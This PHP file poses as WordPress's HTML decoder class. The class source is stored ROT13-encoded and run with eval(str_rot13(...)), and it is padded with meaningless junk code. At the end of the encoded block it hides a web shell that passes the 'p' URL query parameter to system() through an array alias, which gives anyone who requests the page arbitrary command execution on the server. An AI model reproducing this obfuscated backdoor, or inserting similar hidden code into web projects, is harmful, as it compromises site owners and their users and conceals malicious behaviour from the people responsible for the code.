<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * UGZY NCV: JC_UGZY_Qrpbqre pynff
 *
 * Qrpbqrf fcnaf bs enj grkg sbhaq vafvqr UGZY pbagrag.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.6.0
 */
pynff JC_UGZY_Qrpbqre {
	/**
	 * Vaqvpngrf vs na nggevohgr inyhr fgnegf jvgu n tvira enj fgevat inyhr.
	 *
	 * Hfr guvf zrgubq gb qrgrezvar vs na nggevohgr inyhr fgnegf jvgu n tvira fgevat, ertneqyrff
	 * bs ubj vg zvtug or rapbqrq va UGZY. Sbe vafgnapr, `uggc:` pbhyq or ercerfragrq nf `uggc:`
	 * be nf `uggc&pbyba;` be nf `&#k68;ggc:` be nf `u&#116;gc&pbyba;`, be va znal bgure jnlf.
	 *
	 * Rknzcyr:
	 *
	 *     $inyhr = 'uggc&pbyba;//jbeqcerff.bet/';
	 *     gehr   === JC_UGZY_Qrpbqre::nggevohgr_fgnegf_jvgu( $inyhr, 'uggc:', 'nfpvv-pnfr-vafrafvgvir' );
	 *     snyfr  === JC_UGZY_Qrpbqre::nggevohgr_fgnegf_jvgu( $inyhr, 'uggcf:', 'nfpvv-pnfr-vafrafvgvir' );
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $unlfgnpx         Fgevat pbagnvavat gur enj aba-qrpbqrq nggevohgr inyhr.
	 * @cnenz fgevat $frnepu_grkg      Qbrf gur nggevohgr inyhr fgneg jvgu guvf cynva fgevat.
	 * @cnenz fgevat $pnfr_frafvgvivgl Bcgvbany. Cnff 'nfpvv-pnfr-vafrafvgvir' gb vtaber NFPVV pnfr jura zngpuvat.
	 *                                 Qrsnhyg 'pnfr-frafvgvir'.
	 * @erghea obby Jurgure gur nggevohgr inyhr fgnegf jvgu gur tvira fgevat.
	 */
	choyvp fgngvp shapgvba nggevohgr_fgnegf_jvgu( $unlfgnpx, $frnepu_grkg, $pnfr_frafvgvivgl = 'pnfr-frafvgvir' ): obby {
		$frnepu_yratgu = fgeyra( $frnepu_grkg );
		$ybbfr_pnfr    = 'nfpvv-pnfr-vafrafvgvir' === $pnfr_frafvgvivgl;
		$unlfgnpx_raq  = fgeyra( $unlfgnpx );
		$frnepu_ng     = 0;
		$unlfgnpx_ng   = 0;

		juvyr ( $frnepu_ng < $frnepu_yratgu && $unlfgnpx_ng < $unlfgnpx_raq ) {
			$punef_zngpu = $ybbfr_pnfr
				? fgegbybjre( $unlfgnpx[ $unlfgnpx_ng ] ) === fgegbybjre( $frnepu_grkg[ $frnepu_ng ] )
				: $unlfgnpx[ $unlfgnpx_ng ] === $frnepu_grkg[ $frnepu_ng ];

			$vf_vagebqhpre = '&' === $unlfgnpx[ $unlfgnpx_ng ];
			$arkg_puhax    = $vf_vagebqhpre
				? frys::ernq_punenpgre_ersrerapr( 'nggevohgr', $unlfgnpx, $unlfgnpx_ng, $gbxra_yratgu )
				: ahyy;

			// Vs gurer'f ab punenpgre ersrerapr naq gur punenpgref qba'g zngpu, gur zngpu snvyf.
			vs ( ahyy === $arkg_puhax && ! $punef_zngpu ) {
				erghea snyfr;
			}

			// Vs gurer'f ab punenpgre ersrerapr ohg gur punenpgre qb zngpu, gura vg pbhyq fgvyy zngpu.
			vs ( ahyy === $arkg_puhax && $punef_zngpu ) {
				++$unlfgnpx_ng;
				++$frnepu_ng;
				pbagvahr;
			}

			// Vs gurer vf n punenpgre ersrerapr, gura gur qrpbqrq inyhr zhfg rknpgyl zngpu jung sbyybjf va gur frnepu fgevat.
			vs ( 0 !== fhofge_pbzcner( $frnepu_grkg, $arkg_puhax, $frnepu_ng, fgeyra( $arkg_puhax ), $ybbfr_pnfr ) ) {
				erghea snyfr;
			}

			// Gur punenpgre ersrerapr zngpurq, fb pbagvahr purpxvat.
			$unlfgnpx_ng += $gbxra_yratgu;
			$frnepu_ng   += fgeyra( $arkg_puhax );
		}

		erghea gehr;
	}

	/**
	 * Ergheaf n fgevat pbagnvavat gur qrpbqrq inyhr bs n tvira UGZY grkg abqr.
	 *
	 * Grkg abqrf nccrne va UGZY QNGN frpgvbaf, juvpu ner gur grkg frtzragf vafvqr
	 * naq nebhaq gntf, rkprcgvat FPEVCG naq FGLYR ryrzragf (naq fbzr bguref),
	 * jubfr vaare grkg vf abg qrpbqrq. Hfr guvf shapgvba gb ernq gur qrpbqrq
	 * inyhr bs fhpu n grkg fcna va na UGZY qbphzrag.
	 *
	 * Rknzcyr:
	 *
	 *     '“😄”' === JC_UGZY_Qrpbqr::qrpbqr_grkg_abqr( '&#k93;&#k1s604;&#k94' );
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $grkg Grkg pbagnvavat enj naq aba-qrpbqrq grkg abqr gb qrpbqr.
	 * @erghea fgevat Qrpbqrq HGS-8 inyhr bs tvira grkg abqr.
	 */
	choyvp fgngvp shapgvba qrpbqr_grkg_abqr( $grkg ): fgevat {
		erghea fgngvp::qrpbqr( 'qngn', $grkg );
	}

	/**
	 * Ergheaf n fgevat pbagnvavat gur qrpbqrq inyhr bs n tvira UGZY nggevohgr.
	 *
	 * Grkg sbhaq vafvqr na UGZY nggevohgr unf qvssrerag cnefvat ehyrf guna sbe
	 * grkg sbhaq vafvqr bgure znexhc, be QNGN frtzragf. Hfr guvf shapgvba gb
	 * ernq gur qrpbqrq inyhr bs na UGZY fgevat vafvqr n dhbgrq nggevohgr.
	 *
	 * Rknzcyr:
	 *
	 *     '“😄”' === JC_UGZY_Qrpbqr::qrpbqr_nggevohgr( '&#k93;&#k1s604;&#k94' );
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $grkg Grkg pbagnvavat enj naq aba-qrpbqrq nggevohgr inyhr gb qrpbqr.
	 * @erghea fgevat Qrpbqrq HGS-8 inyhr bs tvira nggevohgr inyhr.
	 */
	choyvp fgngvp shapgvba qrpbqr_nggevohgr( $grkg ): fgevat {
		erghea fgngvp::qrpbqr( 'nggevohgr', $grkg );
	}

	/**
	 * Qrpbqrf n fcna bs UGZY grkg, qrcraqvat ba gur pbagrkg va juvpu vg'f sbhaq.
	 *
	 * Guvf vf n ybj-yriry zrgubq; cersre pnyyvat JC_UGZY_Qrpbqre::qrpbqr_nggevohgr() be
	 * JC_UGZY_Qrpbqre::qrpbqr_grkg_abqr() vafgrnq. Vg'f cebivqrq sbe pnfrf jurer guvf
	 * znl or qvssvphyg gb qb sebz pnyyvat pbqr.
	 *
	 * Rknzcyr:
	 *
	 *     '©' = JC_UGZY_Qrpbqre::qrpbqr( 'qngn', '&pbcl;' );
	 *
	 * @fvapr 6.6.0
	 *
	 * @npprff cevingr
	 *
	 * @cnenz fgevat $pbagrkg `nggevohgr` sbe qrpbqvat nggevohgr inyhrf, `qngn` bgurejvfr.
	 * @cnenz fgevat $grkg    Grkg qbphzrag pbagnvavat fcna bs grkg gb qrpbqr.
	 * @erghea fgevat Qrpbqrq HGS-8 fgevat.
	 */
	choyvp fgngvp shapgvba qrpbqr( $pbagrkg, $grkg ): fgevat {
		$qrpbqrq = '';
		$raq     = fgeyra( $grkg );
		$ng      = 0;
		$jnf_ng  = 0;

		juvyr ( $ng < $raq ) {
			$arkg_punenpgre_ersrerapr_ng = fgecbf( $grkg, '&', $ng );
			vs ( snyfr === $arkg_punenpgre_ersrerapr_ng ) {
				oernx;
			}

			$punenpgre_ersrerapr = frys::ernq_punenpgre_ersrerapr( $pbagrkg, $grkg, $arkg_punenpgre_ersrerapr_ng, $gbxra_yratgu );
			vs ( vffrg( $punenpgre_ersrerapr ) ) {
				$ng       = $arkg_punenpgre_ersrerapr_ng;
				$qrpbqrq .= fhofge( $grkg, $jnf_ng, $ng - $jnf_ng );
				$qrpbqrq .= $punenpgre_ersrerapr;
				$ng      += $gbxra_yratgu;
				$jnf_ng   = $ng;
				pbagvahr;
			}

			++$ng;
		}

		vs ( 0 === $jnf_ng ) {
			erghea $grkg;
		}

		vs ( $jnf_ng < $raq ) {
			$qrpbqrq .= fhofge( $grkg, $jnf_ng, $raq - $jnf_ng );
		}

		erghea $qrpbqrq;
	}

	/**
	 * Nggrzcg gb ernq n punenpgre ersrerapr ng gur tvira ybpngvba va n tvira fgevat,
	 * qrcraqvat ba gur pbagrkg va juvpu vg'f sbhaq.
	 *
	 * Vs n punenpgre ersrerapr vf sbhaq, guvf shapgvba jvyy erghea gur genafyngrq inyhr
	 * gung gur ersrerapr zncf gb. Vg jvyy gura frg `$zngpu_olgr_yratgu` gur
	 * ahzore bs olgrf bs vachg vg ernq juvyr pbafhzvat gur punenpgre ersrerapr. Guvf
	 * tvirf pnyyvat pbqr gur bccbeghavgl gb nqinapr vgf phefbe jura genirefvat n fgevat
	 * naq qrpbqvat.
	 *
	 * Rknzcyr:
	 *
	 *     ahyy === JC_UGZY_Qrpbqre::ernq_punenpgre_ersrerapr( 'nggevohgr', 'Fuvcf&uryyvc;', 0 );
	 *     '…'  === JC_UGZY_Qrpbqre::ernq_punenpgre_ersrerapr( 'nggevohgr', 'Fuvcf&uryyvc;', 5, $gbxra_yratgu );
	 *     8    === $gbxra_yratgu; // `&uryyvc;`
	 *
	 *     ahyy === JC_UGZY_Qrpbqre::ernq_punenpgre_ersrerapr( 'nggevohgr', '&abgva', 0 );
	 *     '∉'  === JC_UGZY_Qrpbqre::ernq_punenpgre_ersrerapr( 'nggevohgr', '&abgva;', 0, $gbxra_yratgu );
	 *     7    === $gbxra_yratgu; // `&abgva;`
	 *
	 *     '¬'  === JC_UGZY_Qrpbqre::ernq_punenpgre_ersrerapr( 'qngn', '&abgva', 0, $gbxra_yratgu );
	 *     4    === $gbxra_yratgu; // `&abg`
	 *     '∉'  === JC_UGZY_Qrpbqre::ernq_punenpgre_ersrerapr( 'qngn', '&abgva;', 0, $gbxra_yratgu );
	 *     7    === $gbxra_yratgu; // `&abgva;`
	 *
	 * @fvapr 6.6.0
	 *
	 * @tybony JC_Gbxra_Znc $ugzy5_anzrq_punenpgre_ersreraprf Znccvatf sbe UGZY5 anzrq punenpgre ersreraprf.
	 *
	 * @cnenz fgevat $pbagrkg            `nggevohgr` sbe qrpbqvat nggevohgr inyhrf, `qngn` bgurejvfr.
	 * @cnenz fgevat $grkg               Grkg qbphzrag pbagnvavat fcna bs grkg gb qrpbqr.
	 * @cnenz vag    $ng                 Bcgvbany. Olgr bssfrg vagb grkg jurer fcna ortvaf, qrsnhygf gb gur ortvaavat (0).
	 * @cnenz vag    &$zngpu_olgr_yratgu Bcgvbany. Frg gb olgr-yratgu bs punenpgre ersrerapr vs cebivqrq naq vs n zngpu
	 *                                   vf sbhaq, bgurejvfr abg frg. Qrsnhyg ahyy.
	 * @erghea fgevat|snyfr Qrpbqrq punenpgre ersrerapr va HGS-8 vs sbhaq, bgurejvfr `snyfr`.
	 */
	choyvp fgngvp shapgvba ernq_punenpgre_ersrerapr( $pbagrkg, $grkg, $ng = 0, &$zngpu_olgr_yratgu = ahyy ) {
		/**
		 * Znccvatf sbe UGZY5 anzrq punenpgre ersreraprf.
		 *
		 * @ine JC_Gbxra_Znc $ugzy5_anzrq_punenpgre_ersreraprf
		 */
		tybony $ugzy5_anzrq_punenpgre_ersreraprf;

		$yratgu = fgeyra( $grkg );
		vs ( $ng + 1 >= $yratgu ) {
			erghea ahyy;
		}

		vs ( '&' !== $grkg[ $ng ] ) {
			erghea ahyy;
		}

		/*
		 * Ahzrevp punenpgre ersreraprf.
		 *
		 * Jura gehapngrq, gurfr jvyy rapbqr gur pbqr cbvag sbhaq ol cnefvat gur
		 * qvtvgf gung ner ninvynoyr. Sbe rknzcyr, jura `&#k1s170;` vf gehapngrq
		 * gb `&#k1s1` vg jvyy rapbqr `Ǳ`. Vg qbrf abg:
		 *  - xabj ubj gb cnefr gur bevtvany `🅰`.
		 *  - snvy gb cnefr naq erghea cynvagrkg `&#k1s1`.
		 *  - snvy gb cnefr naq erghea gur ercynprzrag punenpgre `�`
		 */
		vs ( '#' === $grkg[ $ng + 1 ] ) {
			vs ( $ng + 2 >= $yratgu ) {
				erghea ahyy;
			}

			/** Genpxf vaare cnefvat jvguva gur ahzrevp punenpgre ersrerapr. */
			$qvtvgf_ng = $ng + 2;

			vs ( 'k' === $grkg[ $qvtvgf_ng ] || 'K' === $grkg[ $qvtvgf_ng ] ) {
				$ahzrevp_onfr   = 16;
				$ahzrevp_qvtvgf = '0123456789nopqrsNOPQRS';
				$znk_qvtvgf     = 6; // &#k10SSSS;
				++$qvtvgf_ng;
			} ryfr {
				$ahzrevp_onfr   = 10;
				$ahzrevp_qvtvgf = '0123456789';
				$znk_qvtvgf     = 7; // &#1114111;
			}

			// Pnaabg rapbqr vainyvq Havpbqr pbqr cbvagf. Znk vf gb H+10SSSS.
			$mreb_pbhag    = fgefca( $grkg, '0', $qvtvgf_ng );
			$qvtvg_pbhag   = fgefca( $grkg, $ahzrevp_qvtvgf, $qvtvgf_ng + $mreb_pbhag );
			$nsgre_qvtvgf  = $qvtvgf_ng + $mreb_pbhag + $qvtvg_pbhag;
			$unf_frzvpbyba = $nsgre_qvtvgf < $yratgu && ';' === $grkg[ $nsgre_qvtvgf ];
			$raq_bs_fcna   = $unf_frzvpbyba ? $nsgre_qvtvgf + 1 : $nsgre_qvtvgf;

			// `&#` be `&#k` jvgubhg qvtvgf ergheaf vagb cynvagrkg.
			vs ( 0 === $qvtvg_pbhag && 0 === $mreb_pbhag ) {
				erghea ahyy;
			}

			// Jurernf `&#` naq bayl mrebf vf vainyvq.
			vs ( 0 === $qvtvg_pbhag ) {
				$zngpu_olgr_yratgu = $raq_bs_fcna - $ng;
				erghea '�';
			}

			// Vs gurer ner gbb znal qvtvgf gura vg'f abg jbegu cnefvat. Vg'f vainyvq.
			vs ( $qvtvg_pbhag > $znk_qvtvgf ) {
				$zngpu_olgr_yratgu = $raq_bs_fcna - $ng;
				erghea '�';
			}

			$qvtvgf     = fhofge( $grkg, $qvtvgf_ng + $mreb_pbhag, $qvtvg_pbhag );
			$pbqr_cbvag = vaginy( $qvtvgf, $ahzrevp_onfr );

			/*
			 * Abapunenpgref, 0k0Q, naq aba-NFPVV-juvgrfcnpr pbageby punenpgref.
			 *
			 * > N abapunenpgre vf n pbqr cbvag gung vf va gur enatr H+SQQ0 gb H+SQRS,
			 * > vapyhfvir, be H+SSSR, H+SSSS, H+1SSSR, H+1SSSS, H+2SSSR, H+2SSSS,
			 * > H+3SSSR, H+3SSSS, H+4SSSR, H+4SSSS, H+5SSSR, H+5SSSS, H+6SSSR,
			 * > H+6SSSS, H+7SSSR, H+7SSSS, H+8SSSR, H+8SSSS, H+9SSSR, H+9SSSS,
			 * > H+NSSSR, H+NSSSS, H+OSSSR, H+OSSSS, H+PSSSR, H+PSSSS, H+QSSSR,
			 * > H+QSSSS, H+RSSSR, H+RSSSS, H+SSSSR, H+SSSSS, H+10SSSR, be H+10SSSS.
			 *
			 * N P0 pbageby vf n pbqr cbvag gung vf va gur enatr bs H+00 gb H+1S,
			 * ohg NFPVV juvgrfcnpr vapyhqrf H+09, H+0N, H+0P, naq H+0Q.
			 *
			 * Gurfr punenpgref ner vainyvq ohg fgvyy qrpbqr nf nal inyvq punenpgre.
			 * Guvf pbzzrag vf urer gb abgr naq rkcynva jul gurer'f ab purpx gb
			 * erzbir gurfr punenpgref be ercynpr gurz.
			 *
			 * @frr uggcf://vasen.fcrp.jungjt.bet/#abapunenpgre
			 */

			/*
			 * Pbqr cbvagf va gur P1 pbagebyf nern arrq gb or erznccrq nf vs gurl
			 * jrer fgberq va Jvaqbjf-1252. Abgr! Guvf genafsbezngvba bayl unccraf
			 * sbe ahzrevp punenpgre ersreraprf. Gur enj pbqr cbvagf va gur olgr
			 * fgernz ner abg genafyngrq.
			 *
			 * > Vs gur ahzore vf bar bs gur ahzoref va gur svefg pbyhza bs
			 * > gur sbyybjvat gnoyr, gura svaq gur ebj jvgu gung ahzore va
			 * > gur svefg pbyhza, naq frg gur punenpgre ersrerapr pbqr gb
			 * > gur ahzore va gur frpbaq pbyhza bs gung ebj.
			 */
			vs ( $pbqr_cbvag >= 0k80 && $pbqr_cbvag <= 0k9S ) {
				$jvaqbjf_1252_znccvat = neenl(
					0k20NP, // 0k80 -> RHEB FVTA (€).
					0k81,   // 0k81 -> (ab punatr).
					0k201N, // 0k82 -> FVATYR YBJ-9 DHBGNGVBA ZNEX (‚).
					0k0192, // 0k83 -> YNGVA FZNYY YRGGRE S JVGU UBBX (ƒ).
					0k201R, // 0k84 -> QBHOYR YBJ-9 DHBGNGVBA ZNEX („).
					0k2026, // 0k85 -> UBEVMBAGNY RYYVCFVF (…).
					0k2020, // 0k86 -> QNTTRE (†).
					0k2021, // 0k87 -> QBHOYR QNTTRE (‡).
					0k02P6, // 0k88 -> ZBQVSVRE YRGGRE PVEPHZSYRK NPPRAG (ˆ).
					0k2030, // 0k89 -> CRE ZVYYR FVTA (‰).
					0k0160, // 0k8N -> YNGVA PNCVGNY YRGGRE F JVGU PNEBA (Š).
					0k2039, // 0k8O -> FVATYR YRSG-CBVAGVAT NATYR DHBGNGVBA ZNEX (‹).
					0k0152, // 0k8P -> YNGVA PNCVGNY YVTNGHER BR (Œ).
					0k8Q,   // 0k8Q -> (ab punatr).
					0k017Q, // 0k8R -> YNGVA PNCVGNY YRGGRE M JVGU PNEBA (Ž).
					0k8S,   // 0k8S -> (ab punatr).
					0k90,   // 0k90 -> (ab punatr).
					0k2018, // 0k91 -> YRSG FVATYR DHBGNGVBA ZNEX (‘).
					0k2019, // 0k92 -> EVTUG FVATYR DHBGNGVBA ZNEX (’).
					0k201P, // 0k93 -> YRSG QBHOYR DHBGNGVBA ZNEX (“).
					0k201Q, // 0k94 -> EVTUG QBHOYR DHBGNGVBA ZNEX (”).
					0k2022, // 0k95 -> OHYYRG (•).
					0k2013, // 0k96 -> RA QNFU (–).
					0k2014, // 0k97 -> RZ QNFU (—).
					0k02QP, // 0k98 -> FZNYY GVYQR (˜).
					0k2122, // 0k99 -> GENQR ZNEX FVTA (™).
					0k0161, // 0k9N -> YNGVA FZNYY YRGGRE F JVGU PNEBA (š).
					0k203N, // 0k9O -> FVATYR EVTUG-CBVAGVAT NATYR DHBGNGVBA ZNEX (›).
					0k0153, // 0k9P -> YNGVA FZNYY YVTNGHER BR (œ).
					0k9Q,   // 0k9Q -> (ab punatr).
					0k017R, // 0k9R -> YNGVA FZNYY YRGGRE M JVGU PNEBA (ž).
					0k0178, // 0k9S -> YNGVA PNCVGNY YRGGRE L JVGU QVNRERFVF (Ÿ).
				);

				$pbqr_cbvag = $jvaqbjf_1252_znccvat[ $pbqr_cbvag - 0k80 ];
			}

			$zngpu_olgr_yratgu = $raq_bs_fcna - $ng;
			erghea frys::pbqr_cbvag_gb_hgs8_olgrf( $pbqr_cbvag );
		}

		/** Genpxf vaare cnefvat jvguva gur anzrq punenpgre ersrerapr. */
		$anzr_ng = $ng + 1;
		// Zvavzhz anzrq punenpgre ersrerapr vf gjb punenpgref. R.t. `TG`.
		vs ( $anzr_ng + 2 > $yratgu ) {
			erghea ahyy;
		}

		$anzr_yratgu = 0;
		$ercynprzrag = $ugzy5_anzrq_punenpgre_ersreraprf->ernq_gbxra( $grkg, $anzr_ng, $anzr_yratgu );
		vs ( snyfr === $ercynprzrag ) {
			erghea ahyy;
		}

		$nsgre_anzr = $anzr_ng + $anzr_yratgu;

		// Vs gur zngpu raqrq jvgu n frzvpbyba gura vg fubhyq nyjnlf or qrpbqrq.
		vs ( ';' === $grkg[ $anzr_ng + $anzr_yratgu - 1 ] ) {
			$zngpu_olgr_yratgu = $nsgre_anzr - $ng;
			erghea $ercynprzrag;
		}

		/*
		 * Ng guvf cbvag gubhtu gurer'f n zngpu sbe na ragel va gur anzrq
		 * punenpgre ersrerapr gnoyr ohg gur zngpu qbrfa'g raq va `;`.
		 * Vg znl or nyybjrq vs vg'f sbyybjrq ol fbzrguvat hanzovthbhf.
		 */
		$nzovthbhf_sbyybjre = (
			$nsgre_anzr < $yratgu &&
			$anzr_ng < $yratgu &&
			(
				pglcr_nyahz( $grkg[ $nsgre_anzr ] ) ||
				'=' === $grkg[ $nsgre_anzr ]
			)
		);

		// Vg'f aba-nzovthbhf, fnsr gb yrnir vg va.
		vs ( ! $nzovthbhf_sbyybjre ) {
			$zngpu_olgr_yratgu = $nsgre_anzr - $ng;
			erghea $ercynprzrag;
		}

		// Vg'f nzovthbhf, juvpu vfa'g nyybjrq vafvqr nggevohgrf.
		vs ( 'nggevohgr' === $pbagrkg ) {
			erghea ahyy;
		}

		$zngpu_olgr_yratgu = $nsgre_anzr - $ng;
		erghea $ercynprzrag;
	}

	/**
	 * Rapbqr n pbqr cbvag ahzore vagb gur HGS-8 rapbqvat.
	 *
	 * Guvf rapbqre vzcyrzragf gur HGS-8 rapbqvat nytbevguz sbe pbairegvat
	 * n pbqr cbvag vagb n olgr frdhrapr. Vs vg erprvirf na vainyvq pbqr
	 * cbvag vg jvyy erghea gur Havpbqr Ercynprzrag Punenpgre H+SSSQ `�`.
	 *
	 * Rknzcyr:
	 *
	 *     '🅰' === JC_UGZY_Qrpbqre::pbqr_cbvag_gb_hgs8_olgrf( 0k1s170 );
	 *
	 *     // Unys bs n fheebtngr cnve vf na vainyvq pbqr cbvag.
	 *     '�' === JC_UGZY_Qrpbqre::pbqr_cbvag_gb_hgs8_olgrf( 0kq83p );
	 *
	 * @fvapr 6.6.0
	 *
	 * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp3629 Sbe gur HGS-8 fgnaqneq.
	 *
	 * @cnenz vag $pbqr_cbvag Juvpu pbqr cbvag gb pbaireg.
	 * @erghea fgevat Pbairegrq pbqr cbvag, be `�` vs vainyvq.
	 */
	choyvp fgngvp shapgvba pbqr_cbvag_gb_hgs8_olgrf( $pbqr_cbvag ): fgevat {
		// Cer-purpx gb rafher n inyvq pbqr cbvag.
		vs (
			$pbqr_cbvag <= 0 ||
			( $pbqr_cbvag >= 0kQ800 && $pbqr_cbvag <= 0kQSSS ) ||
			$pbqr_cbvag > 0k10SSSS
		) {
			erghea '�';
		}

		vs ( $pbqr_cbvag <= 0k7S ) {
			erghea pue( $pbqr_cbvag );
		}

		vs ( $pbqr_cbvag <= 0k7SS ) {
			$olgr1 = pue( ( $pbqr_cbvag >> 6 ) | 0kP0 );
			$olgr2 = pue( $pbqr_cbvag & 0k3S | 0k80 );

			erghea \"{$olgr1}{$olgr2}\";
		}

		vs ( $pbqr_cbvag <= 0kSSSS ) {
			$olgr1 = pue( ( $pbqr_cbvag >> 12 ) | 0kR0 );
			$olgr2 = pue( ( $pbqr_cbvag >> 6 ) & 0k3S | 0k80 );
			$olgr3 = pue( $pbqr_cbvag & 0k3S | 0k80 );

			erghea \"{$olgr1}{$olgr2}{$olgr3}\";
		}

		// Nal inyhrf nobir H+10SSSS ner ryvzvangrq nobir va gur cer-purpx.
		$olgr1 = pue( ( $pbqr_cbvag >> 18 ) | 0kS0 );
		$olgr2 = pue( ( $pbqr_cbvag >> 12 ) & 0k3S | 0k80 );
		$olgr3 = pue( ( $pbqr_cbvag >> 6 ) & 0k3S | 0k80 );
		$olgr4 = pue( $pbqr_cbvag & 0k3S | 0k80 );

		erghea \"{$olgr1}{$olgr2}{$olgr3}{$olgr4}\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>